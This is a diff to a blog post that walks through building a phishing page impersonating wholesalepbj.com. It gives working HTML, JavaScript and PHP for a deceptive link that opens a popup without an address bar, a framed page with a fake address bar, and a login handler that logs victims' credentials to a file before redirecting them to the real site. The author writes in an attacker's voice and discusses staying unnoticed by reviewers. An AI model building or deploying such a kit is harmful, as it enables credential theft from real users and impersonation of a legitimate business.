@@ -13,21 +13,21 @@ I visited wholesalepbj.com and collected some key images such as the logo and a 
 
 This link contained this code:
 
-{% highlight HTML %}
+```html
 <em>You are almost there!</em>  Just click <a href="http://www.wholesalepbj.com" onclick="return openPBJ()">this link</a> ...
-{% endhighlight %}
+```
 
 Just in case our security professional took a quick look at the code, I wanted to make sure it at least looked 'ok'... hence the name seems "innocent" enough.
 
 This is the javascript code:
 
-{% highlight javascript %}
+```javascript
 function openPBJ() {
     window.open("redirectToPBJ.html", "PBJWindow",
                 "status=0,toolbar=0,location=0,left=1,top=1,height=" + screen.height + ",width=1010");
     return false;
 }
-{% endhighlight %}
+```
 
 Now those clever fellows of us are starting to see where I'm going with this.  First off, we have a link that is pointing to the real website but has a javascript handler.  Our function returns 'false' so we never goto the URL.  Interesting to note, in both FF2 and IE6/7, when you right click on the link and choose properties (or mouse over for that matter), it shows its source as the real website with no mention about the javascript obstructing the URL).  Finally, in this bit of code, we see alot of 'naming' that we're using to hopefully throw off the user.  We 'redirect' to pbj, we name it pbjwindow, etc.  You'll notice the only suspect thing is 'location=0' in our window popup.  On most browsers, this is going to allow us to open this window without an address bar.
 
@@ -35,7 +35,7 @@ At this point, I had thought about being done here... but I know that people are
 
 Lets check out the content of redirectToPBJ.html
 
-{% highlight HTML %}
+```html
 <html>
 	<title>http://www.wholesalepbj.com</title>
 	<frameset rows="27,*" border=0 frameborder=0>
@@ -43,7 +43,7 @@ Lets check out the content of redirectToPBJ.html
 		<frame src="www.wholesalepbj.com.html" name='pbj' scrolling='yes' frameborder='0' noresize></frame>
 	</frameset>
 </html>
-{% endhighlight %}
+```
 
 If the user actually looked at the code, this page becomes more suspect.  But note, still using our misdirection, we do have the source pointing to www.wholesalepbj.com.html.  You may know that that still an html file, but a quick observer might miss that.  Ok, so this content was loaded into the popup window - even the title bar shows our website address.  We're done creating our frames (with no borders and resizing options).
 
@@ -51,7 +51,7 @@ Lets check out the top.html file.  This is responsible for our address bar.  I m
 
 top.html contains this text:
 
-{% highlight HTML %}
+```html
 <style type="text/css">
     body {
         margin: 0px;
@@ -101,7 +101,7 @@ top.html contains this text:
         <input value="Go" id="gobutton" type="submit" />
     </form>
 </p>
-{% endhighlight %}
+```
 
 This is an interesting piece of code.  First off, lets start with what we know.  We know we need and address bar that they're used to seeing - but it has to have the website they expect to be visiting's URL in itself.  It also should function like a normal address bar (It shouldn't just be a picture, it should allow for users to type in it and possibly navigate away from our site.).
 
@@ -119,7 +119,7 @@ Next, we edited the content of my saved copy of the website.  I changed the logi
 
 Lets take a look at what happens when the user logs in.  First off, I changed the input form field to submit to my server's version of login.php.  It contains this code:
 
-{% highlight HTML %}
+```html
 <?php
 //log all of the information.
 $f = fopen('test.txt', 'a');
@@ -129,7 +129,7 @@ fclose($f);  //note - additional spaces added in here cuz wordpress keeps eating
 <script type="text/javascript">
 	parent.window.location.href="http://www.wholesalepbj.com/login.php";
 </script>
-{% endhighlight %}
+```
 
 First off, the script takes care of logging the user credentials (obviously, in production, I'd be writing this to a database... but this shows a good enough example right now.  Then the page loads, and executes javascript right away, which sets and focuses the parent window's location (parent being this popup - remember, we're in frames). to the real website's login page - but not passing any credentials.  Then the user is on the real website and the damage has been done - we have their credentials.
 
